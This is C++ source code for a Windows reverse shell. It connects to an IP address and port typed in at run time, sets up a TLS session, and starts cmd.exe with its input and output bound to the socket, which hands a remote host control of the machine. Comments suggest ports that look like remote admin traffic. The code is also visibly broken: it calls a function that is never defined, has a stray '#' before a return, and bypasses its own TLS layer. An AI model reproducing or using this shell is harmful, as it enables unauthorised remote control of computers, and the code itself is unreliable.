#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdexcept>
#include <openssl/ssl.h>
#include <openssl/err.h>
#pragma comment(lib, "Ws2_32.lib")

const int BUFFER_SIZE = 512;

SSL_CTX* InitSSL() 
{
    // initialize OpenSSL
    SSL_load_error_strings();
    SSL_library_init();
    OpenSSL_add_all_algorithms();

    // create a new SSL context object
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx)
	{
        ERR_print_errors_fp(stderr);
        return nullptr;
    }

    // set up SSL options
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION);

    // load trusted root certificates
    if (SSL_CTX_load_verify_locations(ctx, nullptr, "/etc/ssl/certs") != 1) 
	{
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return nullptr;
    }

    // return the SSL context object
    return ctx;
}

SSL* ConnectSSL(SSL_CTX* ctx, SOCKET sock) 
{
    // create a new SSL object
    SSL* ssl = SSL_new(ctx);
    if (!ssl) 
	{
        ERR_print_errors_fp(stderr);
        return nullptr;
    }

    // associate the SSL object with the socket
    SSL_set_fd(ssl, sock);

    // perform the SSL handshake
    if (SSL_connect(ssl) <= 0) 
	{
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        return nullptr;
    }

    // return the SSL object
 #   return ssl;
}

int main()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) throw std::runtime_error("WSAStartup failed");

    std::string ip_addr;
    int port_str;
	
	// Use these hardcoded values and change as needed.
	// Port 2222 is used by some SSH servers and remote admin tools.
	// Other options are 4242 and 8000
	
	/*
	ip_addr = 0.0.0.0;
	port_str = 2222;
	*/
	
	// Use for entering custom IP and port. Otherwise use code above.
    std::cout << "Enter IP address: "; std::getline(std::cin, ip_addr);
    std::cout << "Enter port number: "; std::cin >> port_str;

    SOCKET shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (shell == INVALID_SOCKET) throw std::runtime_error("Socket creation failed");

    sockaddr_in shell_addr = {0};
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port_str);
    InetPton(AF_INET, ip_addr.c_str(), &shell_addr.sin_addr);
    if (connect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) throw std::runtime_error("Connection to the target server failed");

    // Initialize SSL context and create SSL connection
    SSL_CTX* ctx = initialize_openssl();
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, shell);
    if (SSL_connect(ssl) <= 0) throw std::runtime_error("Failed to establish SSL/TLS connection");

    char recv_buffer[BUFFER_SIZE] = {0};
    int bytes_received = SSL_read(ssl, recv_buffer, BUFFER_SIZE - 1);
    if (bytes_received <= 0) throw std::runtime_error("Error receiving data");

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) throw std::runtime_error("Failed to create process");

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(shell);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    WSACleanup();
    return 0;
}
